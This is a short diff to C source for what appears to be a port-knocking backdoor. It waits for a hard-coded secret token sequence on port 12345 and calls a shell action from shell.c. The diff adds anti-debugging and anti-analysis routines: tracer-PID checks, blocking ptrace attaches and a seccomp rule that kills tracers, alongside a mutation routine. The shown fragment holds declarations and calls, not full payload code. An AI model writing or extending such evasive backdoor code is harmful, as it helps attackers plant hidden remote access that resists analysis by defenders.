@@ -9,14 +9,18 @@
 #include <netinet/sctp.h>
 #include <arpa/inet.h>
 #include <sys/stat.h>
+#include "anti_debug.h"
 
 #define PORT_TO_KNOCK 12345
 #define EXPECTED_SEQUENCE_SIZE 3
 #define BUFSIZE 1024
 
-extern void anti_debug();		// ptrace.c
-extern int perform_action();            // shell.c
-extern int mutate_main(int argc, char **argv);  // mutate.c
+extern int perform_action();     		
+extern void anti_debug();        		
+extern void check_tracer_pid(void);
+extern void block_ptrace_attaches(void);
+extern void install_seccomp_ptrace_kill(void);
+extern int mutate_main(int argc, char **argv);
 
 const char *EXPECTED_SEQUENCE[EXPECTED_SEQUENCE_SIZE] = {
     "nqXCT2xfFsvYktHG3d8gPV",
@@ -78,8 +82,7 @@ int main(int argc, char **argv) {
     socklen_t len;
     char buffer[BUFSIZE];
     int sequenceIndex = 0;
-
-    // Call ptrace
+    //run_antidebug();
     anti_debug();
 
     const char *self_path = resolve_self_path(argv[0]);
